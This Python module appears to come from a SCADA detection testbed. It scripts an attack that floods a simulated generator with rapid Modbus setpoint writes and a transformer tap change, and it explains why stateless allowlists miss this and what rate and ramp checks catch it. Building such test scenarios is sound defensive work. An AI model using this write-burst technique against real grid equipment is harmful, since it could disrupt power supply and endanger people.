"""Attack #5 — Setpoint / tap-changer manipulation.

Writes an out-of-band generator setpoint (and tap change) via Modbus, at a rate
and magnitude no legitimate operator workflow would ever produce — a burst of
FC6/FC16 writes slamming a generator's active-power setpoint to an extreme
value, bypassing the rate limits real EMS software enforces.

Target detection layer: L2 (protocol) — per-RTU write-rate ceiling + value-band
/ ramp-rate checks on holding registers.
"""
from __future__ import annotations

import time

from .common import AttackResult, register, cli_main, live_scada
from scada import rtu_map as rm


ATTACKER_LABEL = "setpoint-injector"
ATTACKER_HOST = "10.0.7.66"


@register("setpoint", attack_class=5, title="Setpoint / tap-changer manipulation", layer="L2 protocol")
def run(rtu_id: str = "rtu-32", target_mw: float = 50.0, burst: int = 6, system=None) -> AttackResult:
    from scada.control_center import CapturingModbusClient

    with live_scada(system) as sysm:
        spec = next(s for s in sysm.specs if s.rtu_id == rtu_id)
        gen_id = spec.gen_id
        before = float(sysm.engine.net.gen.at[gen_id, "p_mw"]) if gen_id is not None else None

        atk = CapturingModbusClient(spec, src_label=ATTACKER_LABEL,
                                    capture=sysm.capture, src_host=ATTACKER_HOST)
        atk.connect()

        # A rapid burst of setpoint writes — far faster than any operator ramp.
        # Ramp the generator hard toward an extreme value in a fraction of a second.
        t0 = time.time()
        steps = []
        for i in range(burst):
            frac = (i + 1) / burst
            mw = before + (target_mw - before) * frac if before is not None else target_mw
            atk.write_register(rm.HR_GEN_SETPOINT, rm.enc_mw(mw),
                               note=f"out-of-band gen setpoint -> {mw:.0f} MW")
            steps.append(round(mw, 1))
            time.sleep(0.02)                       # ~50 writes/sec — way over any ceiling
        # also yank the transformer tap in the same burst (FC16 multi-write)
        if spec.trafo_id is not None:
            atk.write_registers(rm.HR_GEN_SETPOINT,
                                [rm.enc_mw(target_mw), rm.enc_tap(-8)],
                                note="out-of-band setpoint+tap slam")
        dt = time.time() - t0
        atk.close()
        time.sleep(0.5)
        after = float(sysm.engine.net.gen.at[gen_id, "p_mw"]) if gen_id is not None else None
        write_rate = round((burst + 1) / dt, 1)

    return AttackResult(
        name="setpoint",
        attack_class=5,
        title="Setpoint / tap-changer manipulation",
        target_detection_layer="L2 protocol (write-rate ceiling + value/ramp band)",
        executed=(after is not None and abs(after - target_mw) < 5.0),
        changed=[
            f"burst-wrote generator {gen_id} setpoint on {rtu_id}: "
            f"{before:.0f} MW -> {after:.0f} MW via {burst} FC6 writes",
            f"write rate ~{write_rate} writes/s (legit operator ramps are < 1/s)",
            "yanked the transformer tap in the same burst (FC16)",
        ],
        evidence={
            "gen_id": gen_id,
            "setpoint_before_mw": before,
            "setpoint_after_mw": after,
            "write_burst": burst,
            "write_rate_per_s": write_rate,
            "ramp_steps_mw": steps,
        },
        why_hard_to_catch=(
            "Every single write is a valid FC6 to a register that is legitimately "
            "writable, and each individual value is within the raw 16-bit range — a "
            "stateless allowlist waves them all through. The attack lives in the "
            "*aggregate*: dozens of writes per second and a setpoint ramp no turbine "
            "governor could physically follow. Catching it needs L2's write-rate ceiling "
            "and ramp-band check across the sequence, not per-frame validation. (The "
            "physical consequence would eventually show up at L3, but far later and only "
            "after the grid has already been disturbed.)"
        ),
        artifacts={},
    )


def _extra(p):
    p.add_argument("--rtu-id", default="rtu-32")
    p.add_argument("--target-mw", type=float, default=50.0)
    p.add_argument("--burst", type=int, default=6)


if __name__ == "__main__":
    raise SystemExit(cli_main(run, extra_args=_extra))
